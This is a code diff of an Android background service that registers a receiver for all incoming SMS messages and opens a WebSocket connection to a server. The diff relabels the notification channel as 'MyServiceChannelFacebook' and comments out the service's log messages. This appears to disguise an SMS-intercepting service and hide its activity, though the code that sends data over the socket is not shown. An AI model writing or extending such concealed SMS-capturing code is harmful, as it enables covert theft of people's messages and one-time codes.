@@ -21,8 +21,8 @@ import androidx.core.app.NotificationCompat;
 
 public class BackgroundService extends Service {
 
-    private static  String TAG = "Kritika";
-    private static final String CHANNEL_ID = "SmsServiceChannel";
+
+    private static final String CHANNEL_ID = "MyServiceChannelFacebook";
     private SmsReceiver smsReceiver;
     private WebSocketManager webSocketManager;
 
@@ -30,9 +30,7 @@ public class BackgroundService extends Service {
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
-        TAG = Helper.TAG;
 
-        // Register the SMS receiver
         IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
         smsReceiver = new SmsReceiver();
         registerReceiver(smsReceiver, filter);
@@ -42,7 +40,7 @@ public class BackgroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(Helper.TAG, "Foreground service running");
+//        Log.d(Helper.TAG, "Foreground service running");
         webSocketManager = new WebSocketManager(getApplicationContext());
         webSocketManager.connect();
 
@@ -65,7 +63,7 @@ public class BackgroundService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(Helper.TAG, "Foreground service destroyed");
+//        Log.d(Helper.TAG, "Foreground service destroyed");
         if (smsReceiver != null) {
             unregisterReceiver(smsReceiver);
             smsReceiver = null;
